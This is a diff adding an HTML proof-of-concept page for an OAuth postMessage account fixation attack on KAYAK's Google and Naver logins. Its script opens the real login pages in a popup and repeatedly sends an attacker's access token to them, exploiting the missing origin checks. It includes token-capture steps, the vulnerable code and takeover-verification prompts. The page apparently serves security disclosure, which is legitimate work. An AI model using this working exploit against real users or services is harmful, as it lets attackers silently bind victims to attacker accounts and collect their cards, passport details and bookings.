@@ -1,0 +1,389 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>KAYAK OAuth postMessage Account Fixation PoC</title>
+    <style>
+        * { box-sizing: border-box; }
+        body { font-family: -apple-system, BlinkMacSystemFont, monospace; background: #0d1117; color: #c9d1d9; padding: 20px; max-width: 960px; margin: 0 auto; }
+        h1 { color: #ff7b72; font-size: 22px; margin-bottom: 2px; }
+        .subtitle { color: #8b949e; margin-bottom: 20px; font-size: 14px; }
+
+        /* Provider tabs */
+        .tabs { display: flex; gap: 2px; margin-bottom: 0; }
+        .tab { padding: 10px 24px; cursor: pointer; border: 1px solid #30363d; border-bottom: none;
+               border-radius: 6px 6px 0 0; background: #161b22; color: #8b949e; font-size: 14px; font-weight: 600; }
+        .tab.active { background: #1c2128; color: #e6edf3; border-color: #e94560; }
+        .tab.google.active { border-color: #4285f4; }
+        .tab.naver.active { border-color: #2db400; }
+        .tab-content { display: none; border: 1px solid #30363d; border-radius: 0 6px 6px 6px; padding: 20px; background: #1c2128; }
+        .tab-content.active { display: block; }
+
+        /* Phases */
+        .phase { border: 1px solid #30363d; border-radius: 6px; padding: 16px; margin: 12px 0; position: relative; }
+        .phase.done { border-color: #3fb950; opacity: 0.6; }
+        .phase.done::after { content: '✓'; position: absolute; top: 12px; right: 16px; color: #3fb950; font-size: 20px; font-weight: bold; }
+        .phase.active { border-color: #ff7b72; box-shadow: 0 0 10px rgba(255,123,114,0.15); }
+        .phase h3 { margin: 0 0 8px 0; color: #e6edf3; font-size: 15px; }
+        .phase p { margin: 4px 0; color: #8b949e; font-size: 13px; line-height: 1.5; }
+
+        .step-badge { display: inline-block; background: #ff7b72; color: #0d1117; padding: 2px 8px;
+                      border-radius: 10px; font-size: 11px; font-weight: 700; margin-right: 6px; }
+        .step-badge.google { background: #4285f4; }
+        .step-badge.naver { background: #2db400; }
+
+        /* Inputs */
+        input[type="text"] { background: #0d1117; color: #c9d1d9; border: 1px solid #30363d; padding: 10px 12px;
+                             width: 100%; font-family: monospace; font-size: 13px; border-radius: 4px; margin: 8px 0; }
+        input[type="text"]:focus { border-color: #58a6ff; outline: none; }
+
+        /* Buttons */
+        .btn { border: none; padding: 10px 20px; cursor: pointer; font-size: 14px; font-weight: 600;
+               border-radius: 6px; margin: 4px 4px 4px 0; transition: 0.15s; }
+        .btn:hover { filter: brightness(1.1); }
+        .btn:disabled { opacity: 0.4; cursor: not-allowed; filter: none; }
+        .btn-google { background: #4285f4; color: white; }
+        .btn-naver { background: #2db400; color: white; }
+        .btn-stop { background: #30363d; color: #c9d1d9; }
+        .btn-sm { padding: 6px 12px; font-size: 12px; }
+
+        /* Log */
+        #log { background: #0d1117; padding: 12px; white-space: pre-wrap; font-size: 12px; line-height: 1.6;
+               max-height: 350px; overflow-y: auto; border-radius: 6px; border: 1px solid #30363d; margin-top: 12px; }
+        .log-success { color: #3fb950; }
+        .log-warn { color: #d29922; font-weight: bold; }
+        .log-info { color: #58a6ff; }
+        .log-error { color: #ff7b72; }
+        .log-proof { color: #ff7b72; font-weight: bold; font-size: 13px; }
+        .log-dim { color: #484f58; }
+
+        /* Info boxes */
+        .vuln-box { background: #161b22; border-left: 3px solid #ff7b72; padding: 12px 16px; margin: 12px 0; border-radius: 0 6px 6px 0; }
+        .vuln-box code { background: #0d1117; padding: 2px 6px; border-radius: 3px; font-size: 12px; color: #79c0ff; }
+        .impact-box { background: #1a1206; border-left: 3px solid #d29922; padding: 12px 16px; margin: 12px 0; border-radius: 0 6px 6px 0; }
+
+        /* Status indicator */
+        .status { display: inline-block; width: 8px; height: 8px; border-radius: 50%; margin-right: 6px; }
+        .status.idle { background: #484f58; }
+        .status.running { background: #3fb950; animation: pulse 1s infinite; }
+        .status.done { background: #3fb950; }
+        @keyframes pulse { 0%,100% { opacity: 1; } 50% { opacity: 0.4; } }
+
+        /* How-to guide */
+        .guide { background: #161b22; border: 1px solid #30363d; border-radius: 6px; padding: 16px; margin: 12px 0; }
+        .guide h4 { margin: 0 0 8px 0; color: #d29922; font-size: 13px; }
+        .guide ol { margin: 0; padding-left: 20px; color: #8b949e; font-size: 12px; line-height: 1.8; }
+        .guide ol code { background: #0d1117; padding: 1px 4px; border-radius: 2px; color: #79c0ff; }
+
+        a { color: #58a6ff; }
+        small { color: #484f58; }
+    </style>
+</head>
+<body>
+
+<h1>KAYAK OAuth postMessage Account Fixation</h1>
+<div class="subtitle">Cross-origin token injection via missing <code>event.origin</code> validation &mdash; systemic across Google &amp; Naver OAuth</div>
+
+<div class="vuln-box">
+    <strong style="color:#ff7b72;">Root Cause:</strong> KAYAK's OAuth postMessage listeners check
+    <code>event.data.action === "googleLogin"</code> (or <code>"naverLogin"</code>) but do <strong>NOT</strong>
+    check <code>event.origin</code>. Any cross-origin page can inject an attacker-controlled access_token.
+    The Microsoft/Outlook handler in the same codebase <em>correctly</em> validates origin.
+</div>
+
+<!-- Provider tabs -->
+<div class="tabs">
+    <div class="tab google active" onclick="switchTab('google')">Google (kayak.com)</div>
+    <div class="tab naver" onclick="switchTab('naver')">Naver (kayak.co.kr)</div>
+</div>
+
+<!-- ==================== GOOGLE TAB ==================== -->
+<div id="tab-google" class="tab-content active">
+
+    <div class="phase" id="g-phase0">
+        <h3><span class="step-badge google">0</span> Establish victim identity</h3>
+        <p>Log into KAYAK with <strong>your own</strong> Google account. Note your name/email on
+        <a href="https://www.kayak.com/account" target="_blank">kayak.com/account</a>.</p>
+    </div>
+
+    <div class="phase" id="g-phase1">
+        <h3><span class="step-badge google">1</span> Get attacker's Google access_token</h3>
+        <div class="guide">
+            <h4>How to capture the token (video-friendly)</h4>
+            <ol>
+                <li>Open a <strong>different browser</strong> (or incognito with a separate Google account)</li>
+                <li>Go to <a href="https://www.kayak.com/login" target="_blank">kayak.com/login</a></li>
+                <li>Open DevTools → <strong>Network</strong> tab → filter: <code>googleauth</code></li>
+                <li>Click <strong>"Sign in with Google"</strong> and complete the OAuth flow</li>
+                <li>Find the request: <code>POST /k/run/googleauth/login</code></li>
+                <li>In the <strong>Payload</strong> tab, copy the <code>accessToken</code> value</li>
+            </ol>
+        </div>
+        <input type="text" id="googleToken" placeholder="Paste Google access_token here (ya29.a0...)">
+    </div>
+
+    <div class="phase" id="g-phase2">
+        <h3><span class="step-badge google">2</span> Launch attack</h3>
+        <p>Opens <code>kayak.com/login</code> in a popup and injects the attacker's token via cross-origin postMessage.</p>
+        <p style="color:#d29922;">After clicking Launch: click <strong>"Sign in with Google"</strong> on the popup.</p>
+        <button class="btn btn-google" id="btnGoogle" onclick="runAttack('google')">Launch Attack</button>
+        <button class="btn btn-stop" onclick="stopAttack()">Stop</button>
+        <span id="g-status"><span class="status idle"></span>Idle</span>
+    </div>
+
+    <div class="phase" id="g-phase3" style="display:none;">
+        <h3><span class="step-badge google">3</span> Verify account takeover</h3>
+        <p style="color:#ff7b72; font-weight:bold;">
+            Navigate to <a href="https://www.kayak.com/account" target="_blank" style="color:#ff7b72;">kayak.com/account</a>
+            &mdash; the account is now the <strong>attacker's</strong>. Your name, email, and saved data have changed.
+        </p>
+    </div>
+
+</div>
+
+<!-- ==================== NAVER TAB ==================== -->
+<div id="tab-naver" class="tab-content">
+
+    <div class="phase" id="n-phase0">
+        <h3><span class="step-badge naver">0</span> Establish victim identity</h3>
+        <p>Log into KAYAK Korea with <strong>your own</strong> Naver account. Note your name on
+        <a href="https://www.kayak.co.kr/account" target="_blank">kayak.co.kr/account</a>.</p>
+    </div>
+
+    <div class="phase" id="n-phase1">
+        <h3><span class="step-badge naver">1</span> Get attacker's Naver access_token</h3>
+        <div class="guide">
+            <h4>How to capture the token</h4>
+            <ol>
+                <li>Open a <strong>different browser</strong> (or incognito with a separate Naver account)</li>
+                <li>Go to <a href="https://www.kayak.co.kr/login" target="_blank">kayak.co.kr/login</a></li>
+                <li>Open DevTools → <strong>Network</strong> tab → filter: <code>naverauth</code></li>
+                <li>Click the <strong>Naver (네이버)</strong> login button and complete the OAuth flow</li>
+                <li>Find the request: <code>POST /k/run/naverauth/login</code></li>
+                <li>In the <strong>Payload</strong> tab, copy the <code>accessToken</code> value</li>
+            </ol>
+        </div>
+        <input type="text" id="naverToken" placeholder="Paste Naver access_token here">
+        <small>Naver uses implicit grant (response_type=token) — client_id: 3hEjcQKZ8cxZEANc7p5p</small>
+    </div>
+
+    <div class="phase" id="n-phase2">
+        <h3><span class="step-badge naver">2</span> Launch attack</h3>
+        <p>Opens <code>kayak.co.kr/login</code> in a popup and injects the attacker's Naver token.</p>
+        <p style="color:#d29922;">After clicking Launch: click the <strong>Naver (네이버)</strong> button on the popup.</p>
+        <button class="btn btn-naver" id="btnNaver" onclick="runAttack('naver')">Launch Attack</button>
+        <button class="btn btn-stop" onclick="stopAttack()">Stop</button>
+        <span id="n-status"><span class="status idle"></span>Idle</span>
+    </div>
+
+    <div class="phase" id="n-phase3" style="display:none;">
+        <h3><span class="step-badge naver">3</span> Verify account takeover</h3>
+        <p style="color:#ff7b72; font-weight:bold;">
+            Navigate to <a href="https://www.kayak.co.kr/account" target="_blank" style="color:#ff7b72;">kayak.co.kr/account</a>
+            &mdash; the account is now the <strong>attacker's</strong> Naver account.
+        </p>
+    </div>
+
+</div>
+
+<!-- Log output -->
+<pre id="log"></pre>
+
+<!-- Impact section -->
+<div class="impact-box">
+    <strong style="color:#d29922;">Impact:</strong> Account fixation &mdash; victim is silently logged into attacker's KAYAK account.
+    Any credit cards, passport data, traveler details, or bookings entered by the victim are stored in the attacker's account.
+    Affects <strong>all KAYAK regional domains</strong> using Google OAuth and <strong>kayak.co.kr</strong> using Naver OAuth (~30M Korean users).
+</div>
+
+<div class="vuln-box" style="border-color:#30363d; margin-top:16px;">
+    <strong style="color:#8b949e;">Vulnerable code (Frontier JS bundle):</strong><br>
+    <code style="display:block; margin:8px 0; white-space:pre; font-size:11px; color:#c9d1d9;">// Google — NO origin check:
+"googleLogin"===t.action?(i&&i.close(),t.access_token?n(t):o(t)):o(e),
+window.addEventListener("message",r._messageListener)
+
+// Naver — NO origin check:
+"naverLogin"===t.action?(o&&o.close(),t.access_token?r(t):n(t)):n(e),
+window.addEventListener("message",e._messageListener)
+
+// Microsoft — CORRECTLY validates origin:
+if(e.origin !== expectedOrigin) return;  // ← This check is MISSING above</code>
+</div>
+
+<script>
+var targetWin = null;
+var pollInterval = null;
+var checkInterval = null;
+var msgCount = 0;
+var activeProvider = null;
+var logEl = document.getElementById('log');
+
+function log(msg, cls) {
+    var ts = new Date().toISOString().substr(11, 12);
+    logEl.innerHTML += '<span class="' + (cls || 'log-dim') + '">[' + ts + '] ' + msg + '</span>\n';
+    logEl.scrollTop = logEl.scrollHeight;
+}
+
+function switchTab(provider) {
+    document.querySelectorAll('.tab').forEach(function(t) { t.classList.remove('active'); });
+    document.querySelectorAll('.tab-content').forEach(function(t) { t.classList.remove('active'); });
+    document.querySelector('.tab.' + provider).classList.add('active');
+    document.getElementById('tab-' + provider).classList.add('active');
+}
+
+function setPhase(provider, phase) {
+    var prefix = provider === 'google' ? 'g' : 'n';
+    for (var i = 0; i <= 3; i++) {
+        var el = document.getElementById(prefix + '-phase' + i);
+        if (!el) continue;
+        el.classList.remove('done', 'active');
+        el.style.display = '';
+        if (i < phase) el.classList.add('done');
+        if (i === phase) el.classList.add('active');
+    }
+    if (phase >= 3) {
+        document.getElementById(prefix + '-phase3').style.display = '';
+    }
+}
+
+function setStatus(provider, state, text) {
+    var prefix = provider === 'google' ? 'g' : 'n';
+    var el = document.getElementById(prefix + '-status');
+    el.innerHTML = '<span class="status ' + state + '"></span>' + text;
+}
+
+function runAttack(provider) {
+    var tokenEl = provider === 'google' ? 'googleToken' : 'naverToken';
+    var token = document.getElementById(tokenEl).value.trim();
+    if (!token) {
+        log('ERROR: Paste the attacker\'s access_token in Step 1 first.', 'log-error');
+        return;
+    }
+
+    // Stop any existing attack
+    stopAttack();
+    activeProvider = provider;
+
+    var action = provider === 'google' ? 'googleLogin' : 'naverLogin';
+    var domain = provider === 'google' ? 'www.kayak.com' : 'www.kayak.co.kr';
+    var loginUrl = 'https://' + domain + '/login';
+    var color = provider === 'google' ? '#4285f4' : '#2db400';
+
+    setPhase(provider, 2);
+    setStatus(provider, 'running', 'Attacking...');
+
+    log('', '');
+    log('═══════════════════════════════════════════════════', 'log-info');
+    log('  ' + provider.toUpperCase() + ' OAUTH ACCOUNT FIXATION ATTACK', 'log-info');
+    log('═══════════════════════════════════════════════════', 'log-info');
+    log('');
+    log('Opening ' + loginUrl + ' in popup...', 'log-info');
+
+    targetWin = window.open(loginUrl, 'kayak_target', 'width=1100,height=750,left=100,top=100');
+    if (!targetWin) {
+        log('Popup blocked! Allow popups for this site and retry.', 'log-error');
+        setStatus(provider, 'idle', 'Blocked');
+        return;
+    }
+
+    log('Popup opened.', 'log-success');
+    log('');
+    log('Cross-origin postMessage injection starting...', 'log-info');
+    log('  Source: ' + location.origin + ' (attacker page)', 'log-dim');
+    log('  Target: https://' + domain + ' (victim popup)', 'log-dim');
+    log('  Payload: {action: "' + action + '", access_token: "' + token.substring(0,16) + '..."}', 'log-dim');
+    log('');
+
+    msgCount = 0;
+    pollInterval = setInterval(function() {
+        try {
+            targetWin.postMessage({action: action, access_token: token}, "*");
+            msgCount++;
+            if (msgCount === 1) {
+                log('Injection active — sending attacker token every 100ms.', 'log-success');
+                log('');
+                if (provider === 'google') {
+                    log('  >>> NOW: Click "Sign in with Google" on the popup <<<', 'log-warn');
+                } else {
+                    log('  >>> NOW: Click the Naver (네이버) button on the popup <<<', 'log-warn');
+                }
+                log('');
+                log('  KAYAK will process our injected token (no origin check).', 'log-info');
+                log('  POST /k/run/' + provider + 'auth/login will fire with attacker token.', 'log-info');
+                log('');
+            }
+            if (msgCount % 200 === 0) {
+                log('... ' + msgCount + ' messages sent, polling ...', 'log-dim');
+            }
+        } catch(e) {
+            if (targetWin && targetWin.closed) {
+                onPopupClosed();
+            }
+        }
+    }, 100);
+
+    // Watch for popup close (indicates auth completed)
+    checkInterval = setInterval(function() {
+        try {
+            if (targetWin && targetWin.closed) {
+                onPopupClosed();
+            }
+        } catch(e) {}
+    }, 500);
+
+    // Prompt to verify after 10s
+    setTimeout(function() {
+        if (pollInterval && activeProvider === provider) {
+            log('');
+            log('If you\'ve clicked the OAuth button on the popup:', 'log-warn');
+            log('');
+            log('  VERIFY: Open https://' + domain + '/account', 'log-proof');
+            log('  The logged-in account is now the ATTACKER\'s.', 'log-proof');
+            log('');
+        }
+    }, 10000);
+
+    // Auto-stop after 60s
+    setTimeout(function() {
+        if (pollInterval && activeProvider === provider) {
+            stopAttack();
+            log('Auto-stopped after 60 seconds.', 'log-dim');
+        }
+    }, 60000);
+}
+
+function onPopupClosed() {
+    var provider = activeProvider;
+    stopAttack();
+    log('');
+    log('Popup closed.', 'log-info');
+    log('');
+    if (provider) {
+        var domain = provider === 'google' ? 'www.kayak.com' : 'www.kayak.co.kr';
+        log('  ════════════════════════════════════════', 'log-proof');
+        log('  PROOF: Navigate to https://' + domain + '/account', 'log-proof');
+        log('  The account is now the ATTACKER\'s — not the victim\'s.', 'log-proof');
+        log('  ════════════════════════════════════════', 'log-proof');
+        setPhase(provider, 3);
+        setStatus(provider, 'done', 'Complete — verify account');
+    }
+}
+
+function stopAttack() {
+    if (pollInterval) { clearInterval(pollInterval); pollInterval = null; }
+    if (checkInterval) { clearInterval(checkInterval); checkInterval = null; }
+    if (msgCount > 0) {
+        log('Stopped after ' + msgCount + ' messages.', 'log-dim');
+        if (activeProvider) setStatus(activeProvider, 'idle', 'Stopped (' + msgCount + ' msgs)');
+    }
+    msgCount = 0;
+}
+</script>
+
+<div style="margin-top:20px; padding-top:12px; border-top:1px solid #21262d; color:#484f58; font-size:11px;">
+    Finding: OAuth postMessage Account Fixation (systemic) | Affects: Google OAuth (all KAYAK domains) + Naver OAuth (kayak.co.kr)<br>
+    Attack surface: client-side postMessage listener without event.origin validation<br>
+    poc-mastermind.com &mdash; Authorized security testing only
+</div>
+
+</body>
+</html>
